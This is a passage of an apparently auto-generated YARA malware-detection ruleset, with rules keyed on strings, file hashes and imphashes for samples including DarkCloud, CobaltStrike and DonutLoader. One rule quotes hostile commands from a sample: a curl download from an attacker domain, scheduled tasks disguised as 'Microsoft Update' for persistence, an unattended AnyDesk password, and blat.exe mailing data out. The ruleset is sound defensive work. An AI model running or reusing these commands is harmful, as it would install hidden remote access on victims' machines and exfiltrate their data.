      $s1 = "compress/flate.(*hcode).set" fullword ascii /* score: '10.00'*/
      $s2 = "compress/flate.byFreq.Len" fullword ascii /* score: '10.00'*/
      $s3 = "bytes.NewReader" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.stringtoslicerune" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.rawruneslice" fullword ascii /* score: '10.00'*/
      $s6 = "compress/flate.byLiteral.Len" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.convT16" fullword ascii /* score: '10.00'*/
      $s8 = "compress/flate.(*byLiteral).Len" fullword ascii /* score: '10.00'*/
      $s9 = "bytes.(*Reader).Len" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.FuncForPC" fullword ascii /* score: '10.00'*/
      $s11 = "compress/flate.(*byFreq).Len" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3_df875748_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__662a1ce_80 {
   meta:
      description = "_subset_batch - from files df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3_df875748.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_662a1ce6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "df875748170a5e5cf55bd12dfdc70ae68bd91219b0d4bd71b4320fb095cbe3b3"
      hash2 = "662a1ce669ea5867deb1e22b76c29e8a4d6e2cd8b8becbec0aa7dc9d80748a60"
   strings:
      $x1 = "costura.system.security.principal.windows.dll.compressed|5.0.0.0|System.Security.Principal.Windows, Version=5.0.0.0, Culture=neu" ascii /* score: '44.00'*/
      $x2 = "costura.system.serviceprocess.servicecontroller.dll.compressed" fullword wide /* score: '33.00'*/
      $x3 = "costura.system.security.principal.windows.dll.compressed|5.0.0.0|System.Security.Principal.Windows, Version=5.0.0.0, Culture=neu" ascii /* score: '33.00'*/
      $s4 = "costura.system.diagnostics.eventlog.dll.compressed" fullword wide /* score: '30.00'*/
      $s5 = "tral, PublicKeyToken=b03f5f7f11d50a3a|System.Security.Principal.Windows.dll|9A5BE1FCF410FE5934D720329D36A2377E83747E|18312" fullword ascii /* score: '30.00'*/
      $s6 = "costura.system.net.ipnetwork.dll.compressed" fullword wide /* score: '25.00'*/
      $s7 = "costura.system.security.principal.windows.dll.compressed" fullword wide /* score: '25.00'*/
      $s8 = "costura.microsoft.win32.taskscheduler.dll.compressed" fullword wide /* score: '22.00'*/
      $s9 = "system.serviceprocess.servicecontroller" fullword wide /* score: '18.00'*/
      $s10 = "system.diagnostics.eventlog" fullword wide /* score: '15.00'*/
      $s11 = "system.net.ipnetwork" fullword wide /* score: '13.00'*/
      $s12 = "system.security.principal.windows" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4b5ab219_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5c40e8f9_81 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b5ab219.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c40e8f9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b5ab21936973e603ac60128fd84f60d05bcfcdd8d1ce00dfcabd7786ebe5544"
      hash2 = "5c40e8f9e423c91f90492c3a3195668696ce52bd80fc56e06c23f50602d14cf7"
   strings:
      $s1 = "get_ErrorForegroundColor" fullword ascii /* score: '12.00'*/
      $s2 = "get_ErrorBackgroundColor" fullword ascii /* score: '12.00'*/
      $s3 = "ReadKey_Box" fullword ascii /* score: '10.00'*/
      $s4 = "get_VerboseBackgroundColor" fullword ascii /* score: '9.00'*/
      $s5 = "get_WarningForegroundColor" fullword ascii /* score: '9.00'*/
      $s6 = "get_VerboseForegroundColor" fullword ascii /* score: '9.00'*/
      $s7 = "get_DebugForegroundColor" fullword ascii /* score: '9.00'*/
      $s8 = "get_ProgressBackgroundColor" fullword ascii /* score: '9.00'*/
      $s9 = "get_DebugBackgroundColor" fullword ascii /* score: '9.00'*/
      $s10 = "get_WarningBackgroundColor" fullword ascii /* score: '9.00'*/
      $s11 = "get_ProgressForegroundColor" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fea120df_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6b383dbf_82 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fea120df.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b383dbf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fea120df5c94e88e821356de20db5ec2b9eeb020e308731c81e74999c2656c5f"
      hash2 = "6b383dbfba15a64be112c2b0cf49bf100e41f99a1ee59f20736fe47f3664a0f5"
   strings:
      $s1 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s2 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s3 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s4 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s5 = ")Globalsign TSA for Advanced - G4 - 2023110" fullword ascii /* score: '12.00'*/
      $s6 = ")Globalsign TSA for Advanced - G4 - 202311" fullword ascii /* score: '12.00'*/
      $s7 = "GlobalSign Root CA - R61" fullword ascii /* score: '11.00'*/
      $s8 = "(GlobalSign Timestamping CA - SHA384 - G4" fullword ascii /* score: '11.00'*/
      $s9 = "(GlobalSign Timestamping CA - SHA384 - G40" fullword ascii /* score: '11.00'*/
      $s10 = "7http://secure.globalsign.com/cacert/gstsacasha384g4.crt0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 900KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__662a1ce_83 {
   meta:
      description = "_subset_batch - from files cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_662a1ce6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9"
      hash2 = "662a1ce669ea5867deb1e22b76c29e8a4d6e2cd8b8becbec0aa7dc9d80748a60"
   strings:
      $x1 = "costura.system.valuetuple.dll.compressed|4.0.3.0|System.ValueTuple, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2" ascii /* score: '42.00'*/
      $s2 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s3 = "costura.system.text.json.dll.compressed" fullword wide /* score: '25.00'*/
      $s4 = "costura.system.text.encodings.web.dll.compressed" fullword wide /* score: '25.00'*/
      $s5 = "costura.system.threading.tasks.extensions.dll.compressed" fullword wide /* score: '25.00'*/
      $s6 = "costura.system.valuetuple.dll.compressed" fullword wide /* score: '25.00'*/
      $s7 = "costura.microsoft.bcl.asyncinterfaces.dll.compressed" fullword wide /* score: '22.00'*/
      $s8 = "costura.icsharpcode.sharpziplib.dll.compressed" fullword wide /* score: '22.00'*/
      $s9 = "costura.websocket-sharp.dll.compressed" fullword wide /* score: '22.00'*/
      $s10 = "system.text.encodings.web" fullword wide /* score: '13.00'*/
      $s11 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s12 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s13 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s14 = "microsoft.bcl.asyncinterfaces" fullword wide /* score: '10.00'*/
      $s15 = "system.text.json" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b913d0ba4c81312099d6776c0c0806486254be12e7b0cb0ce19b9fa9203397f3_b913d0ba_e7ef795b332cb3eb29955a21afc938a92a47d09425ab9d7e6_84 {
   meta:
      description = "_subset_batch - from files b913d0ba4c81312099d6776c0c0806486254be12e7b0cb0ce19b9fa9203397f3_b913d0ba.js, e7ef795b332cb3eb29955a21afc938a92a47d09425ab9d7e65573371db560bab_e7ef795b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b913d0ba4c81312099d6776c0c0806486254be12e7b0cb0ce19b9fa9203397f3"
      hash2 = "e7ef795b332cb3eb29955a21afc938a92a47d09425ab9d7e65573371db560bab"
   strings:
      $s1 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s2 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s3 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s4 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s5 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s7 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s8 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s9 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s10 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s12 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s13 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s14 = "    // Get PDC configuration file from script context" fullword ascii /* score: '13.00'*/
      $s15 = "            + \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' \"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _c9adc83b45e363b21cd6b11b5da0501f_imphash__16ac0b5d_c9adc83b45e363b21cd6b11b5da0501f_imphash__b3b6f660_85 {
   meta:
      description = "_subset_batch - from files c9adc83b45e363b21cd6b11b5da0501f(imphash)_16ac0b5d.exe, c9adc83b45e363b21cd6b11b5da0501f(imphash)_b3b6f660.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "16ac0b5d2b25528812c2e6bbe94b9e266b37be6aa56db97192def60a74e63dbe"
      hash2 = "b3b6f660bc37e1ece5e638dfdaf87b97899df972f6cebe5062fd964142b1fcce"
   strings:
      $s1 = "/c curl.exe -k -L -o \"@$&%17\\Nvidia\\fdbnjgcergf1.rar\" --resolve zakypky-ru-info.website:443:66.29.132.150 https://zakypky-ru" ascii /* score: '27.00'*/
      $s2 = "/c curl.exe -k -L -o \"@$&%17\\Nvidia\\fdbnjgcergf1.rar\" --resolve zakypky-ru-info.website:443:66.29.132.150 https://zakypky-ru" ascii /* score: '27.00'*/
      $s3 = "/c schtasks /create /tn \"Auto apdate\" /tr \"\\\"@$&%17\\Nvidia\\Trays\\Trays.exe\\\" -tray\" /sc onlogon /rl highest /f" fullword ascii /* score: '26.00'*/
      $s4 = "/c @$&%17\\Nvidia\\driver.exe a -r -ep -hplimpid2903392 @$&%17\\Nvidia\\AnyDesk1.rar %Programdata%\\AnyDesk  /y" fullword ascii /* score: '26.00'*/
      $s5 = "/c schtasks /create /tn \"Microsoft Update\" /tr \"@$&%17\\Nvidia\\AnyDesk\\Anydesk.exe\" /sc onlogon /rl highest /f" fullword ascii /* score: '26.00'*/
      $s6 = "/c del /q @$&%17\\Nvidia\\blat.exe" fullword ascii /* score: '23.00'*/
      $s7 = "/c echo QWERTY1234566 | @$&%17\\Nvidia\\AnyDesk\\AnyDesk.exe --set-password _unattended_access" fullword ascii /* score: '23.00'*/
      $s8 = "/c @$&%17\\Nvidia\\driver.exe a -r -ep -hplimpid2903392 @$&%17\\Nvidia\\AnyDesk.rar @$&%26\\AnyDesk  /y" fullword ascii /* score: '22.00'*/
      $s9 = "/c @$&%17\\Nvidia\\blat.exe -to in@vniir.nl -f \"AnyDesk<sent1@vniir.nl>\" -server mail.vniir.nl -port 587 -u sent1@vniir.nl -pw" ascii /* score: '22.00'*/
      $s10 = "/c @$&%17\\Nvidia\\blat.exe -to in@vniir.nl -f \"AnyDesk<sent1@vniir.nl>\" -server mail.vniir.nl -port 587 -u sent1@vniir.nl -pw" ascii /* score: '22.00'*/
      $s11 = "/c @$&%17\\Nvidia\\driver.exe x -r -ep2 -p\"limpid2903392\" @$&%17\\Nvidia\\fdbnjgcergf1.rar @$&%17\\Nvidia /y" fullword ascii /* score: '22.00'*/
      $s12 = "/c @$&%17\\Nvidia\\blat.exe -to in@vniir.nl -f \"AnyDesk<sent1@vniir.nl>\" -server mail.vniir.nl -port 587 -u sent1@vniir.nl -pw" ascii /* score: '22.00'*/
      $s13 = "/c ping 127.0.0.1 -n 40" fullword ascii /* score: '20.00'*/
      $s14 = "/c ping 127.0.0.1 -n 60" fullword ascii /* score: '20.00'*/
      $s15 = "/c start @$&%17\\Nvidia\\Trays\\Trays.exe -tray" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "c9adc83b45e363b21cd6b11b5da0501f" and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__CobaltStrike_signature__f0ea7b7844bbc5bfa9bb32efdcea957c_imph_86 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash3 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash4 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
   strings:
      $s1 = "type:.eq.syscall.DLL" fullword ascii /* score: '16.00'*/
      $s2 = "type:.eq.syscall.DLLError" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.block" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.cbsLock" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.wintls" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.cbsUnlock" fullword ascii /* score: '10.00'*/
      $s7 = "type:.eq.syscall.LazyDLL" fullword ascii /* score: '9.00'*/
      $s8 = "type:.hash.runtime.winCallbackKey" fullword ascii /* score: '9.00'*/
      $s9 = "syscall.GetEnvironmentVariable" fullword ascii /* score: '8.00'*/
      $s10 = "syscall.GetFileAttributesEx" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

